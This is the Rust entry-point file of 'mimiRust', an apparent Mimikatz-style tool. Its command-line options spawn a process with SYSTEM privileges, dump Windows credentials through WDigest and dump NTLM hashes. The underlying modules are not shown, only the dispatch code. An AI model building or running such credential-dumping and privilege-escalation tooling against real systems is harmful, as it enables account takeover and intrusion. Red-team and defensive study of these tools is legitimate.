pub mod password_grabbing;
pub mod escalation_permissions;
pub mod utilities;

use password_grabbing::{wdigest::Wdigest, ntlm::Ntlm};
use escalation_permissions::Escalation;

use clap::Parser;

#[derive(Parser, Debug)]
#[clap(about, author)]
struct Args {
    /// Spawn program with SYSTEM permissions from location
    #[clap(short, long, default_value = "")]
    spawn_path: String,

    /// Dumps systems credentials through Wdigest
    #[clap(long)]
    dump_credentials: bool,

    /// Dumps systems NTLM hashes
    #[clap(long)]
    dump_ntlm_hashes: bool,
}


fn main() {
    let args = Args::parse();

    if args.spawn_path.len() == 0 && args.dump_credentials == false && args.dump_ntlm_hashes == false {
        println!("To see options please do: mimiRust.exe --help");
    }

    if args.spawn_path.len() > 0 {
        Escalation::get_system(args.spawn_path);
    }

    if args.dump_credentials {
        Wdigest::grab();
    }

    if args.dump_ntlm_hashes {
        Ntlm::grab();
    }
}